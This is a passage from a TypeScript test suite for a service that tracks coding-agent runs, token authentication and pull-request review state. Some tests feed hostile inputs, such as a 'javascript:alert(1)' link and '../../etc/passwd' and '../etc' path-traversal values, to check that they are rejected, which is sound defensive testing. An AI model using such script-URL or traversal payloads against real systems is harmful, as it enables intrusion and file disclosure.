import assert from 'node:assert';
import { mkdtemp, rm } from 'node:fs/promises';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import express from 'express';
import { bearerToken, generateIngestToken, hashIngestToken } from '../auth/ingest-token';
import { PinRateLimiter } from '../auth/session';
import {
  DEFAULT_MACHINE,
  OrchestratorInputError,
  OrchestratorService,
  attentionItems,
  parseLedger,
  normalizeMachine,
  parseTranscript,
  reduceHookEvent,
  throttledPullRequestLookup,
  toOrchestration,
} from '../integrations/orchestrator';
import type { ChatService } from '../integrations/chat';
import { LedgerPeer } from '../integrations/ledger-peer';
import { createOrchestratorIngestRouter } from '../routes/orchestrator';
import type { StorageService } from '../storage/service';

const withoutLedger = (row: any) => {
  if (!row) return null;
  const { ledgerRaw: _ledgerRaw, ...rest } = row;
  return rest;
};

function memoryStorage() {
  const runs = new Map<string, any>();
  const events: any[] = [];
  const tokens: any[] = [];
  let sequence = 0;
  const storage = {
    getOrchestratorRuns: async () => [...runs.values()].map(withoutLedger),
    getOrchestratorRun: async (key: string) => withoutLedger(runs.get(key)),
    getOrchestratorRunWithLedger: async (key: string) => runs.get(key) ?? null,
    countLiveOrchestratorRuns: async (machine: string) => [...runs.values()].filter((row) => row.machine === machine && !row.dismissedAt).length,
    upsertOrchestratorRun: async (key: string, data: any) => {
      const existing = runs.get(key);
      if (existing && existing.machine !== data.machine) return existing;
      const row = {
        activity: 'IDLE', activityDetail: null, activityEndedAt: null, lastEventAt: null, transcriptAt: null,
        ...existing, key, ...data, dismissedAt: null,
      };
      runs.set(key, row);
      return row;
    },
    takeDismissedOrchestratorRun: async (key: string, data: any) => {
      const existing = runs.get(key);
      if (existing?.dismissedAt) runs.set(key, { ...existing, ...data, handover: null, dismissedAt: null, activity: 'IDLE', activityDetail: null, activityEndedAt: null, lastEventAt: null, transcriptAt: null });
      return runs.get(key);
    },
    changeOrchestratorRunOwner: async (key: string, expected: { machine: string; handover: string | null }, machine: string) => {
      const row = runs.get(key);
      if (!row || row.machine !== expected.machine || (row.handover ?? null) !== expected.handover) return false;
      runs.set(key, { ...row, machine, handover: null });
      return true;
    },
    updateOrchestratorRun: async (key: string, data: any) => {
      const row = { ...runs.get(key), ...data };
      runs.set(key, row);
      return row;
    },
    addOrchestratorToolEvents: async () => undefined,
    getOrchestratorEvents: async (ticketKey: string, take: number) => events
      .filter((event) => event.ticketKey === ticketKey).reverse().slice(0, take),
    addOrchestratorEvent: async (ticketKey: string, kind: string, detail: string | null) => {
      const event = { id: String(sequence += 1), ticketKey, kind, detail, createdAt: new Date() };
      events.push(event);
      return event;
    },
    getIngestTokens: async () => tokens.filter((token) => !token.revokedAt),
    countIngestTokens: async () => tokens.filter((token) => !token.revokedAt).length,
    createIngestToken: async (data: any) => {
      const token = { id: String(sequence += 1), machine: 'laptop', ...data, createdAt: new Date(), lastUsedAt: null, revokedAt: null };
      tokens.push(token);
      return token;
    },
    findIngestToken: async (tokenHash: string) => tokens.find((token) => token.tokenHash === tokenHash && !token.revokedAt) ?? null,
    touchIngestToken: async (id: string, lastUsedAt: Date) => {
      const token = tokens.find((item) => item.id === id);
      if (token) token.lastUsedAt = lastUsedAt;
      return token;
    },
    revokeIngestToken: async (id: string) => {
      const token = tokens.find((item) => item.id === id && !item.revokedAt);
      if (token) token.revokedAt = new Date();
      return { count: token ? 1 : 0 };
    },
  };
  return { storage: storage as unknown as StorageService, runs, events, tokens };
}

const ledger = {
  key: 'qrd-1387',
  title: 'Assign panel: remove an assignment from an agent',
  stage: 'verify',
  waiting: 'Confirm the contract before opening the PR',
  gate: 'ASK FIRST',
  ac: [
    { n: 1, state: 'PASS', text: 'Each row has a remove action', evidence: 'E:/local/ac-1.png' },
    { n: 2, state: 'fail', text: 'Removal is scoped to this agent' },
    { n: 3, state: 'something else', text: 'Persists after reload' },
  ],
  tests: { be: '54 suites / 535 tests passed', fe: '50 files / 684 tests passed' },
  pr: { be: 'https://github.com/example/be/pull/1', fe: 'javascript:alert(1)' },
  ports: { be: 3187, fe: 5287 },
  dirs: { be: 'E:/local/wt-1387-be' },
  updatedAt: '2026-10-04T08:15:33.256Z',
};

test('orchestrator ledger parsing keeps only what DOCK shows', () => {
  const parsed = parseLedger(ledger, new Date('2026-10-05T00:00:00.000Z'));
  assert.strictEqual(parsed.key, 'QRD-1387');
  assert.strictEqual(parsed.kind, 'build');
  assert.strictEqual(parseLedger({ ...ledger, kind: 'review' }).kind, 'review');
  assert.strictEqual(parseLedger({ ...ledger, kind: 'anything' }).kind, 'build');
  assert.deepStrictEqual(parsed.ac.map((item) => item.state), ['PASS', 'FAIL', 'TODO']);
  assert.strictEqual(parsed.prBe, 'https://github.com/example/be/pull/1');
  assert.strictEqual(parsed.prFe, null, 'non-HTTP PR links are dropped');
  assert.strictEqual(parsed.updatedAt, '2026-10-04T08:15:33.256Z');
  assert.strictEqual(parsed.brief, null);
  assert.deepStrictEqual(parsed.decisions, []);
  const withBrief = parseLedger({ ...ledger, brief: 'line 1\nline 2', decisions: [{ at: '2026-10-04T08:00:00.000Z', text: 'use X' }, 'bad', { at: 'x' }, null] });
  assert.strictEqual(withBrief.brief, 'line 1\nline 2');
  assert.deepStrictEqual(withBrief.decisions, [{ at: '2026-10-04T08:00:00.000Z', text: 'use X' }]);
  assert.deepStrictEqual(parsed.assumptions, []);
  assert.deepStrictEqual(parsed.failures, []);
  assert.strictEqual(parsed.closing, null);
  const withRisk = parseLedger({
    ...ledger,
    assumptions: [{ n: 1, text: 'BE returns hold', falsifier: 'the room has no such field', state: 'refuted', evidence: 'curl output' }, { text: 'no state' }, { falsifier: 'no text' }, 'bad'],
    failures: [{ at: '2026-10-04T08:00:00.000Z', type: 'transient', what: 'be tests', evidence: 'ETIMEDOUT', attempt: 2 }, { type: 'unknown', evidence: 'x' }, null],
    closing: { hours: 6.5, fixRounds: 2, replans: 1, failures: { transient: 2 } },
  });
  assert.deepStrictEqual(withRisk.assumptions, [
    { n: 1, text: 'BE returns hold', falsifier: 'the room has no such field', state: 'refuted', evidence: 'curl output' },
    { n: 2, text: 'no state', falsifier: '', state: 'open', evidence: null },
  ]);
  assert.deepStrictEqual(withRisk.failures, [{ at: '2026-10-04T08:00:00.000Z', type: 'transient', what: 'be tests', evidence: 'ETIMEDOUT', attempt: 2 }]);
  assert.deepStrictEqual(withRisk.closing, { hours: 6.5, fixRounds: 2, replans: 1 });
  assert.ok(!('dirs' in parsed) && !('ports' in parsed), 'local paths and ports stay on the laptop');

  assert.throws(() => parseLedger({ ...ledger, key: '../etc' }), OrchestratorInputError);
  assert.throws(() => parseLedger({ ...ledger, stage: 'shipping' }), OrchestratorInputError);
  assert.throws(() => parseLedger({ ...ledger, ac: Array.from({ length: 51 }, () => ({})) }), OrchestratorInputError);
  assert.strictEqual(
    parseLedger({ ...ledger, updatedAt: '2999-01-01T00:00:00.000Z' }, new Date('2026-10-05T00:00:00.000Z')).updatedAt,
    '2026-10-05T00:00:00.000Z',
    'a clock ahead of the server is clamped',
  );
});

test('hook events follow the Idle / Active / Waiting rules', () => {
  const idle = { activity: 'IDLE' as const, activityDetail: null, activityEndedAt: null };
  const now = new Date('2026-10-05T00:00:00.000Z');

  const active = reduceHookEvent(idle, 'PreToolUse', 'Edit', now);
  assert.deepStrictEqual(active, { activity: 'ACTIVE', activityDetail: 'Edit', activityEndedAt: null });

  const ended = reduceHookEvent(active, 'PostToolUse', null, now);
  assert.strictEqual(ended.activity, 'ACTIVE', 'the tool ending starts the grace window, it does not flip the state');
  assert.strictEqual(ended.activityEndedAt, now);

  assert.strictEqual(reduceHookEvent(active, 'PermissionRequest', null, now).activityDetail, 'permission');
  assert.strictEqual(reduceHookEvent(active, 'Notification', null, now).activity, 'WAITING');
  assert.deepStrictEqual(reduceHookEvent(idle, 'Stop', null, now), idle);
});

test('read model applies the grace window, the owner gate and staleness', () => {
  const base = {
    key: 'QRD-1', title: 'Ticket', stage: 'code', waiting: '', payload: JSON.stringify({ ac: [] }),
    activity: 'ACTIVE', activityDetail: 'Edit', activityEndedAt: null as Date | null,
    lastEventAt: new Date('2026-10-05T00:00:00.000Z'), ledgerUpdatedAt: new Date('2026-10-04T00:00:00.000Z'),
    transcriptAt: null, dismissedAt: null,
  };
  const at = (seconds: number) => new Date(base.lastEventAt.getTime() + seconds * 1000);

  assert.strictEqual(toOrchestration(base, at(5)).activity, 'ACTIVE');
  assert.strictEqual(toOrchestration({ ...base, activityEndedAt: at(0) }, at(1)).activity, 'ACTIVE', 'inside the 1.5 s grace window');
  assert.strictEqual(toOrchestration({ ...base, activityEndedAt: at(0) }, at(2)).activity, 'IDLE');

  const gated = toOrchestration({ ...base, waiting: 'Approve the plan' }, at(5));
  assert.strictEqual(gated.activity, 'WAITING', 'the ledger gate wins over the hook state');
  assert.strictEqual(gated.stalled, false);

  assert.strictEqual(toOrchestration(base, at(9 * 60)).stalled, false);
  assert.strictEqual(toOrchestration(base, at(11 * 60)).stalled, true, 'an active agent is stale after 10 minutes');
  assert.strictEqual(toOrchestration({ ...base, activity: 'IDLE' }, at(11 * 60)).stalled, false);
  assert.strictEqual(toOrchestration({ ...base, activity: 'IDLE' }, at(31 * 60)).stalled, true, 'an idle agent is stale after 30 minutes');
  assert.strictEqual(toOrchestration({ ...base, stage: 'done' }, at(99 * 60)).stalled, false);
  assert.strictEqual(toOrchestration(base, at(42)).idleSeconds, 42);
});

test('orchestrator service ingests ledgers, events and builds attention items', async () => {
  const { storage, events } = memoryStorage();
  const transcripts = await mkdtemp(path.join(os.tmpdir(), 'dock-transcripts-'));
  const service = new OrchestratorService(storage, transcripts);
  const now = new Date('2026-10-05T00:00:00.000Z');

  try {
    assert.strictEqual(await service.ingestHookEvent({ key: 'QRD-1387', event: 'PreToolUse' }, now, 'laptop'), null, 'unknown tickets are not created by hooks');

    const run = await service.ingestLedger(ledger, now, 'laptop');
    assert.strictEqual(run.activity, 'WAITING');
    assert.deepStrictEqual([run.acPassed, run.acFailed, run.acTotal], [1, 1, 3]);
    assert.deepStrictEqual(events.map((event) => event.kind), ['STAGE', 'WAITING']);

    assert.deepStrictEqual((await service.needsAttention(now)).map((item) => item.type), ['AGENT_WAITING', 'AGENT_AC_FAILED']);

    await service.ingestLedger({ ...ledger, waiting: '', stage: 'pr', ac: [], pr: {} }, now, 'laptop');
    assert.deepStrictEqual(events.map((event) => event.kind), ['STAGE', 'WAITING', 'STAGE', 'RESUMED']);

    const working = await service.ingestHookEvent({ key: 'QRD-1387', event: 'PreToolUse', detail: 'Bash' }, now, 'laptop');
    assert.strictEqual(working?.activity, 'ACTIVE');
    await service.ingestHookEvent({ key: 'QRD-1387', event: 'PreToolUse', detail: 'Read' }, now, 'laptop');
    assert.strictEqual(events.filter((event) => event.kind === 'AGENT_ACTIVE').length, 1, 'repeated tool calls do not grow the event log');

    const later = new Date(now.getTime() + 45 * 60 * 1000);
    assert.deepStrictEqual(attentionItems(await service.list(later)).map((item) => item.type), ['AGENT_STALLED']);

    assert.strictEqual(await service.readTranscript('QRD-1387'), null);
    const stats = await service.saveTranscript({
      key: 'QRD-1387', files: [{ path: 'abc.jsonl', text: '{"type":"user"}\n' }], stats: { masked: 3 },
    }, now, 'laptop');
    assert.deepStrictEqual(stats, { files: 1, bytes: 16, masked: 3 });
    assert.deepStrictEqual(JSON.parse(await service.readTranscript('QRD-1387') || '{}').files[0].path, 'abc.jsonl');
    assert.strictEqual((await service.get('QRD-1387', now))?.hasTranscript, true);
    assert.throws(() => parseTranscript({ key: 'QRD-1', files: [{ path: '../../etc/passwd', text: '' }] }), OrchestratorInputError);
    assert.strictEqual(await service.readTranscript('../QRD-1387'), null);

    assert.strictEqual(await service.dismiss('QRD-1387', 'laptop'), true);
    assert.deepStrictEqual(await service.list(now), []);
    await service.ingestLedger(ledger, now, 'laptop');
    assert.strictEqual((await service.list(now)).length, 1, 'a new ledger push brings a dismissed run back');
  } finally {
    await rm(transcripts, { recursive: true, force: true });
  }
});

test('ingest tokens are shown once, stored hashed and revocable', async () => {
  const { storage, tokens } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());

  const created = await service.createToken('  laptop  ');
  assert.match(created.token, /^dock_ing_[A-Za-z0-9_-]{43}$/);
  assert.strictEqual(created.record.name, 'laptop');
  assert.strictEqual(tokens[0].tokenHash, hashIngestToken(created.token));
  assert.ok(!JSON.stringify(tokens).includes(created.token), 'the secret itself is never stored');
  assert.ok(!JSON.stringify(await service.tokens()).includes(tokens[0].tokenHash));

  assert.strictEqual(await service.authenticateMachine(created.token), 'laptop');
  assert.strictEqual(await service.authenticateMachine(generateIngestToken().token), null);
  assert.strictEqual(await service.revokeToken(created.record.id), true);
  assert.strictEqual(await service.authenticateMachine(created.token), null);
  await assert.rejects(service.createToken(' '), OrchestratorInputError);

  const header = (authorization?: string) => bearerToken({ headers: { authorization } } as any);
  assert.strictEqual(header(`Bearer ${created.token}`), created.token);
  assert.strictEqual(header('Bearer some-other-secret'), null);
  assert.strictEqual(header(undefined), null);
});

test('ingest routes require a token and throttle only failures', async (t) => {
  const { storage } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  const { token } = await service.createToken('laptop');
  const app = express();
  app.use('/ingest/orchestrator', createOrchestratorIngestRouter(service, new PinRateLimiter(2, 60_000)));
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  assert.ok(address && typeof address !== 'string');
  const baseUrl = `http://127.0.0.1:${address.port}/ingest/orchestrator`;
  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));

  const post = (route: string, body: unknown, bearer?: string) => fetch(`${baseUrl}${route}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...(bearer ? { authorization: `Bearer ${bearer}` } : {}) },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });

  assert.strictEqual((await post('', ledger)).status, 401);

  const accepted = await post('', ledger, token);
  assert.strictEqual(accepted.status, 200);
  assert.deepStrictEqual(await accepted.json(), { ok: true, result: { key: 'QRD-1387', stage: 'verify' } });

  assert.strictEqual((await post('', { ...ledger, stage: 'nope' }, token)).status, 400);
  assert.strictEqual((await post('', '{not json', token)).status, 400);
  assert.strictEqual((await post('/event', { key: 'QRD-9', event: 'PreToolUse' }, token)).status, 404);
  assert.strictEqual((await post('/event', { key: 'QRD-1387', event: 'PreToolUse', detail: 'Edit' }, token)).status, 200);

  assert.strictEqual((await post('', ledger, 'dock_ing_wrong')).status, 401);
  assert.strictEqual((await post('', ledger, 'dock_ing_wrong')).status, 429, 'failures are throttled');
  assert.strictEqual((await post('', ledger, token)).status, 200, 'a valid token is not locked out by failed attempts');
});

test('a run with a pull request is waiting for review, not stalled', async () => {
  const lastEventAt = new Date('2026-10-05T00:00:00.000Z');
  const row = (stage: string, ledger: object = {}) => ({
    key: 'QRD-1387', title: 'Ticket', stage, waiting: '', payload: JSON.stringify({ ac: [], ...ledger }),
    activity: 'IDLE', activityDetail: null, activityEndedAt: null as Date | null,
    lastEventAt, ledgerUpdatedAt: lastEventAt, transcriptAt: null, dismissedAt: null,
  });
  const later = new Date(lastEventAt.getTime() + 45 * 60 * 1000);
  const pr = (status: 'open' | 'draft' | 'merged' | 'closed', number = 7) => ({ url: `https://github.com/example/be/pull/${number}`, number, repo: 'example/be', status });

  const none = toOrchestration(row('pr'), later);
  assert.deepStrictEqual([none.stalled, none.review, none.pullRequests], [true, null, []], 'no pull request: unchanged');
  assert.deepStrictEqual(toOrchestration(row('pr'), later, [pr('closed')]).review, null);

  const open = toOrchestration(row('pr'), later, [pr('merged', 6), pr('open')]);
  assert.deepStrictEqual([open.stalled, open.review], [false, 'open']);
  assert.strictEqual(toOrchestration(row('pr'), later, [pr('draft')]).review, 'open');
  assert.deepStrictEqual(attentionItems([open]), [], 'no AGENT_STALLED item for a run in review');

  const merged = toOrchestration(row('pr'), later, [pr('merged', 6), pr('merged')]);
  assert.deepStrictEqual([merged.stalled, merged.review], [false, 'merged']);

  const fromLedger = toOrchestration(row('pr', { prBe: 'https://github.com/example/be/pull/9' }), later);
  assert.deepStrictEqual([fromLedger.stalled, fromLedger.review], [false, 'open']);
  assert.deepStrictEqual(fromLedger.pullRequests, [{ url: 'https://github.com/example/be/pull/9', number: 9, repo: 'example/be', status: 'open' }]);

  const done = toOrchestration(row('done'), later, [pr('open')]);
  assert.deepStrictEqual([done.stalled, done.review], [false, null]);

  const finished = (stage: string, prs: Array<ReturnType<typeof pr>>) => toOrchestration(row(stage), later, prs).finished;
  assert.deepStrictEqual(
    [finished('done', []), finished('pr', [pr('merged', 1), pr('merged', 2)]), finished('pr', [pr('merged', 1), pr('open', 2)]), finished('pr', [pr('closed')]), finished('pr', [pr('merged', 1), pr('closed', 2)]), finished('pr', [])],
    [true, true, false, false, false, false],
    'done stage or every pull request merged; closed-only, mixed and no PR are not finished',
  );
  const mergedRun = toOrchestration({ ...row('pr'), waiting: 'Approve?', payload: JSON.stringify({ ac: [{ n: 1, state: 'FAIL', text: 'x' }] }) }, later, [pr('merged')]);
  assert.deepStrictEqual(attentionItems([mergedRun]), [], 'a merged run produces no attention item');

  const active = { ...row('pr'), activity: 'ACTIVE', activityDetail: 'Bash' };
  const at = (minutes: number) => new Date(lastEventAt.getTime() + minutes * 60 * 1000);
  const silent = toOrchestration(active, at(11), [pr('open')]);
  assert.deepStrictEqual([silent.activity, silent.activityDetail, silent.endedSeconds, silent.stalled, silent.review], ['IDLE', null, null, false, 'open']);
  assert.strictEqual(toOrchestration(active, at(2), [pr('open')]).activity, 'ACTIVE', 'a recent event still reads Working');
  const noPr = toOrchestration(active, at(11));
  assert.deepStrictEqual([noPr.activity, noPr.stalled], ['ACTIVE', true], 'without a pull request a stale ACTIVE run is stalled');
  assert.strictEqual(toOrchestration({ ...active, waiting: 'Approve' }, at(11), [pr('open')]).activity, 'WAITING');
});

test('the service looks up GitHub only for runs that can be in review', async () => {
  const { storage } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir(), async (key) => {
    calls.push(key);
    if (key === 'QRD-3') throw new Error('GitHub down');
    return [{ url: 'https://github.com/example/be/pull/1', number: 1, repo: 'example/be', status: 'open' }];
  });
  const calls: string[] = [];
  const now = new Date('2026-10-05T00:00:00.000Z');
  const ledger = (key: string, stage: string) => ({ key, title: key, stage, ac: [] });
  for (const [key, stage] of [['QRD-1', 'code'], ['QRD-2', 'pr'], ['QRD-3', 'commit'], ['QRD-4', 'done']]) {
    await service.ingestLedger(ledger(key, stage), now, 'laptop');
  }

  const runs = await service.list(now);
  assert.deepStrictEqual(calls.sort(), ['QRD-2', 'QRD-3'], 'only pr/commit/evidence runs, never code or done');
  assert.deepStrictEqual(runs.map((run) => run.review), [null, 'open', null, null], 'a failing lookup does not fail the list');

  calls.length = 0;
  const stale = new Date(now.getTime() + 45 * 60 * 1000);
  await service.list(stale);
  assert.deepStrictEqual(calls.sort(), ['QRD-1', 'QRD-2', 'QRD-3'], 'a run that would be stalled is looked up too');
});

test('the pull request lookup asks GitHub at most once per ticket per window', async () => {
  let clock = 1_000;
  let searches = 0;
  const lookup = throttledPullRequestLookup(async () => {
    searches += 1;
    return [{ url: 'https://github.com/example/be/pull/1', number: 1, repo: 'example/be', status: 'open' as const }];
  }, 5 * 60 * 1000, () => clock);

  await Promise.all([lookup('QRD-1'), lookup('QRD-1')]);
  assert.strictEqual(searches, 1);
  clock += 4 * 60 * 1000;
  assert.strictEqual((await lookup('QRD-1')).length, 1);
  assert.strictEqual(searches, 1, 'still inside the window');
  await lookup('QRD-2');
  assert.strictEqual(searches, 2, 'the window is per ticket');
  clock += 2 * 60 * 1000;
  await lookup('QRD-1');
  assert.strictEqual(searches, 3);
});

test('a hook-level waiting ends when an agent acts or stops, and does not outlive a quiet spell', async () => {
  const { storage } = memoryStorage();
  Object.assign(storage, { addOrchestratorToolEvents: async () => undefined });
  const service = new OrchestratorService(storage, os.tmpdir());
  const start = new Date('2026-10-05T00:00:00.000Z');
  const after = (seconds: number) => new Date(start.getTime() + seconds * 1000);
  await service.ingestLedger({ key: 'QRD-5', title: 'Ticket', stage: 'pr', ac: [] }, start, 'laptop');
  const batch = async (events: object[], now: Date) => service.ingestEventBatch({ key: 'QRD-5', events: events.map((event) => ({ at: now.toISOString(), ...event })) }, now, 'laptop');
  const notification = { event: 'Notification', detail: 'Claude needs your permission', agentId: 'sub-1', agentType: 'test-runner' };

  assert.strictEqual((await batch([notification], after(10)))?.activity, 'WAITING', 'a pending prompt still shows');
  assert.strictEqual((await batch([{ event: 'SubagentStop', agentId: 'sub-1', agentType: 'test-runner' }], after(20)))?.activity, 'IDLE', 'the agent stopping ends it');

  await batch([notification], after(30));
  assert.strictEqual((await batch([{ event: 'Stop', agentId: 'sub-1', agentType: 'test-runner' }], after(40)))?.activity, 'IDLE', 'a subagent turn ending ends it');

  await batch([notification], after(50));
  assert.strictEqual((await batch([{ event: 'Stop' }], after(60)))?.activity, 'IDLE', 'the main session stopping ends it');

  await batch([notification], after(70));
  assert.strictEqual((await batch([{ event: 'PreToolUse', tool: 'Read' }], after(80)))?.activity, 'ACTIVE', 'acting again ends it');

  await batch([notification], after(90));
  const quietSpell = 31 * 60;
  assert.strictEqual((await service.get('QRD-5', after(90 + 29 * 60)))?.activity, 'WAITING', 'still inside the quiet window');
  const quiet = await service.get('QRD-5', after(90 + quietSpell));
  assert.deepStrictEqual([quiet?.activity, quiet?.activityDetail], ['IDLE', null], 'no event for 30 minutes: nobody is blocked on it');

  await service.ingestLedger({ key: 'QRD-5', title: 'Ticket', stage: 'pr', ac: [], waiting: 'Approve the merge?' }, after(90), 'laptop');
  assert.deepStrictEqual([(await service.get('QRD-5', after(90 + 3 * 3600)))?.activity, (await service.get('QRD-5', after(90 + 3 * 3600)))?.activityDetail], ['WAITING', 'gate'], 'the ledger gate never expires');
});

test('review signals reach the run and Needs Attention, and only for open pull requests', () => {
  const lastEventAt = new Date('2026-10-05T00:00:00.000Z');
  const row = {
    key: 'QRD-1387', title: 'Ticket', stage: 'pr', waiting: '', payload: JSON.stringify({ ac: [] }),
    activity: 'IDLE', activityDetail: null, activityEndedAt: null as Date | null,
    lastEventAt, ledgerUpdatedAt: lastEventAt, transcriptAt: null, dismissedAt: null,
  };
  const now = new Date(lastEventAt.getTime() + 60 * 1000);
  const pr = (number: number, status: 'open' | 'merged' | 'closed', reviewDecision: 'changes_requested' | 'approved' | 'none', checks: 'failing' | 'pending' | 'passing' | 'none') => (
    { url: `https://github.com/example/be/pull/${number}`, number, repo: 'example/be', status, reviewDecision, checks }
  );
  const types = (prs: ReturnType<typeof pr>[]) => attentionItems([toOrchestration(row, now, prs)]).map((item) => item.type);

  const both = toOrchestration(row, now, [pr(7, 'open', 'changes_requested', 'failing'), pr(8, 'open', 'approved', 'failing')]);
  assert.deepStrictEqual([both.review, both.reviewSignal], ['open', 'changes_requested']);
  assert.deepStrictEqual(attentionItems([both]).map((item) => [item.type, item.message]), [
    ['AGENT_CHANGES_REQUESTED', 'Changes requested on example/be#7'],
    ['AGENT_CHECKS_FAILING', 'Checks failing on example/be#7, example/be#8'],
  ]);
  assert.deepStrictEqual(types([pr(7, 'open', 'none', 'failing')]), ['AGENT_CHECKS_FAILING']);
  assert.deepStrictEqual(types([pr(7, 'open', 'approved', 'pending')]), [], 'running checks and approvals need no attention');
  assert.strictEqual(toOrchestration(row, now, [pr(7, 'open', 'approved', 'pending')]).reviewSignal, 'checks_pending');
  assert.strictEqual(toOrchestration(row, now, [pr(7, 'open', 'approved', 'passing')]).reviewSignal, 'approved');
  assert.deepStrictEqual(types([pr(7, 'merged', 'changes_requested', 'failing')]), [], 'a merged run produces none');
  assert.deepStrictEqual(types([pr(7, 'merged', 'changes_requested', 'failing'), pr(8, 'open', 'none', 'none')]), [], 'a merged pull request is not blamed while another is open');
  assert.deepStrictEqual(types([pr(7, 'closed', 'changes_requested', 'failing')]), [], 'a closed one does not count');
  assert.deepStrictEqual(attentionItems([toOrchestration({ ...row, stage: 'done' }, now, [pr(7, 'open', 'changes_requested', 'failing')])]), [], 'a finished run produces none');

  const unknown = toOrchestration(row, now, [{ url: 'https://github.com/example/be/pull/9', number: 9, repo: 'example/be', status: 'open' }]);
  assert.deepStrictEqual([unknown.review, unknown.reviewSignal, attentionItems([unknown])], ['open', null, []], 'without facts from GitHub the run reads as before');
});

test('a token carries a machine name; the legacy token is the laptop', async () => {
  const { storage } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());

  const unnamed = await service.createToken('  Laptop 2 ');
  assert.strictEqual(unnamed.record.machine, 'laptop', 'a missing machine is the laptop, never derived from the token name');
  assert.strictEqual((await service.createToken('Third', '   ')).record.machine, 'laptop', 'a blank machine is the laptop too');
  assert.strictEqual((await service.createToken('Fourth', null)).record.machine, 'laptop');
  const named = await service.createToken('Second', 'Workspace');
  assert.strictEqual(named.record.machine, 'workspace');
  await assert.rejects(service.createToken('x', '9bad name'), OrchestratorInputError);
  assert.throws(() => normalizeMachine('a'.repeat(25)), OrchestratorInputError);
  assert.strictEqual(DEFAULT_MACHINE, 'laptop');

  assert.strictEqual(await service.authenticateMachine(named.token), 'workspace');
  assert.strictEqual(await service.authenticateMachine(generateIngestToken().token), null);
  assert.deepStrictEqual((await service.tokens()).map((token) => token.machine), ['laptop', 'laptop', 'laptop', 'workspace']);
  assert.deepStrictEqual(await service.machines(), ['laptop', 'workspace']);

  const generated = generateIngestToken();
  await storage.createIngestToken({ name: 'kit', prefix: generated.prefix, tokenHash: generated.tokenHash } as Parameters<StorageService['createIngestToken']>[0]);
  assert.strictEqual(await service.authenticateMachine(generated.token), 'laptop', 'a token created before machines existed is the laptop');

  assert.strictEqual(await service.revokeToken(named.record.id), true);
  assert.strictEqual(await service.authenticateMachine(named.token), null);
  assert.deepStrictEqual(await service.machines(), ['laptop']);
});

test('a ticket belongs to one machine; a ledger or an event from another is ignored', async () => {
  const { storage, events, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  const start = new Date('2026-10-05T00:00:00.000Z');
  const at = (minutes: number) => new Date(start.getTime() + minutes * 60 * 1000);
  const base = { ...ledger, key: 'ZED-201', waiting: '', stage: 'code', ac: [], pr: {}, history: [{ at: 'x', to: 'code' }], handoffs: [{ who: 'be', proven: true }] };
  const push = (machine: string, minutes: number, updatedAt: number, extra: object = {}) => service.ingestLedger({ ...base, ...extra, updatedAt: at(updatedAt).toISOString() }, at(minutes), machine);

  const created = await push('laptop', 0, 0);
  assert.deepStrictEqual([created.machine, created.ignored], ['laptop', false]);
  const raw = JSON.parse(runs.get('ZED-201').ledgerRaw);
  assert.deepStrictEqual([raw.history, raw.handoffs.length, 'dirs' in raw, 'ports' in raw], [base.history, 1, false, false]);
  await service.ingestHookEvent({ key: 'ZED-201', event: 'PreToolUse', detail: 'Bash' }, at(1), 'laptop');

  await service.ingestHookEvent({ key: 'ZED-201', event: 'Stop' }, at(2), 'workspace');
  assert.strictEqual((await service.ingestHookEvent({ key: 'ZED-201', event: 'PreToolUse', detail: 'Edit' }, at(2), 'workspace'))?.machine, 'laptop');
  await service.ingestEventBatch({ key: 'ZED-201', events: [{ event: 'Notification', at: at(2).toISOString() }] }, at(2), 'workspace');
  assert.notStrictEqual(await service.saveTranscript({ key: 'ZED-201', files: [{ path: 'a.jsonl', text: '{}' }] }, at(2), 'workspace'), null);
  assert.strictEqual(await service.readTranscript('ZED-201'), null, 'a transcript from another machine is not stored');
  const owned = await service.get('ZED-201', at(2));
  assert.deepStrictEqual([owned?.activity, owned?.activityDetail, owned?.machine], ['ACTIVE', 'Bash', 'laptop']);

  const before = { ...runs.get('ZED-201') };
  for (const [minutes, updatedAt] of [[5, 4], [120, 119], [180, -1]]) {
    const other = await push('workspace', minutes, updatedAt, { stage: 'test' });
    assert.deepStrictEqual([other.ignored, other.machine, other.stage], [true, 'laptop', 'code'], 'a newer ledger never takes the ticket, however long the owner was quiet');
  }
  assert.deepStrictEqual(runs.get('ZED-201'), before, 'the stored row did not change');
  assert.deepStrictEqual(events.map((event) => event.kind), ['STAGE', 'AGENT_ACTIVE']);
});

test('a ticket moves only by an offer that the other machine accepts', async () => {
  const { storage, events, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  await service.createToken('workspace', 'workspace');
  const start = new Date('2026-10-05T00:00:00.000Z');
  const at = (minutes: number) => new Date(start.getTime() + minutes * 60 * 1000);
  const base = { ...ledger, key: 'ZED-201', waiting: '', stage: 'code', ac: [], pr: {}, history: [{ at: 'x', to: 'code' }] };
  const push = (machine: string, minutes: number, extra: object = {}) => service.ingestLedger({ ...base, ...extra, updatedAt: at(minutes).toISOString() }, at(minutes), machine);
  const offer = { key: 'ZED-201', to: 'workspace', note: 'tests next', branches: { be: 'feat/zed-201-be', fe: 'feat/zed-201-fe' } };

  await push('laptop', 0);
  await push('laptop', 0, { key: 'ZED-102' });
  assert.deepStrictEqual((await service.ledgerList('workspace')).runs, [], 'a machine lists only what it owns or is offered');
  assert.deepStrictEqual((await service.ledgerList('laptop')).runs.map((run) => run.mine), [true, true]);
  assert.strictEqual(await service.ledgerGet({ key: 'ZED-201' }, 'workspace'), null, 'a ticket that is not offered answers like a missing one');
  assert.strictEqual((await service.ledgerGet({ key: 'ZED-201' }, 'laptop'))?.machine, 'laptop');

  await assert.rejects(service.ledgerHandover(offer, 'workspace', at(1)), /Only the owning machine/);
  await assert.rejects(service.ledgerHandover({ ...offer, to: 'phone' }, 'laptop', at(1)), /Unknown machine/);
  await assert.rejects(service.ledgerHandover({ ...offer, to: 'laptop' }, 'laptop', at(1)), /must differ/);
